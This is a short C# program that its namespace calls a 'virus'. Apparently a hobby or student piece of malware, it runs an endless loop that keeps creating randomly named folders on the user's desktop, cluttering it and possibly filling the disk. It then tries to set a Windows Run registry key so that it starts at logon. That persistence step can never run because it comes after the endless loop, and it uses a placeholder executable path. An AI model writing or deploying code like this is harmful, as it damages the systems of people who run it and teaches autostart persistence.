using Microsoft.Win32;
using System;
using System.IO;

namespace VirusCreateKadnikov
{
    class Program
    {
        interface IFolderCreator
        {
            void CreateFolder(string folderName);
        }

        class FolderCreator : IFolderCreator
        {
            private static FolderCreator instance;

            private FolderCreator() { }

            public static FolderCreator GetInstance()
            {
                if (instance == null)
                {
                    instance = new FolderCreator();
                }

                return instance;
            }

            public void CreateFolder(string folderName)
            {
                Directory.CreateDirectory(folderName);
                Console.WriteLine($"Created folder: {folderName}");
            }
        }

        class DesktopPathProvider
        {
            public string GetDesktopPath()
            {
                return Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            }
        }

        class FolderCreationManager
        {
            private readonly IFolderCreator folderCreator;
            private readonly DesktopPathProvider pathProvider;

            public FolderCreationManager(IFolderCreator folderCreator, DesktopPathProvider pathProvider)
            {
                this.folderCreator = folderCreator;
                this.pathProvider = pathProvider;
            }

            public void StartCreatingFolders()
            {
                string desktopPath = pathProvider.GetDesktopPath();

                while (true)
                {
                    string folderName = Path.Combine(desktopPath, Guid.NewGuid().ToString());
                    folderCreator.CreateFolder(folderName);
                }
            }
        }
        static void Main(string[] args)
        {
      
                FolderCreator folderCreator = FolderCreator.GetInstance();
                DesktopPathProvider pathProvider = new DesktopPathProvider();
                FolderCreationManager creationManager = new FolderCreationManager(folderCreator, pathProvider);

                creationManager.StartCreatingFolders();
            string executablePath = @"C:\Path\To\Your\Executable.exe";

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("MyApplication", executablePath);
            }
        }
    }
}
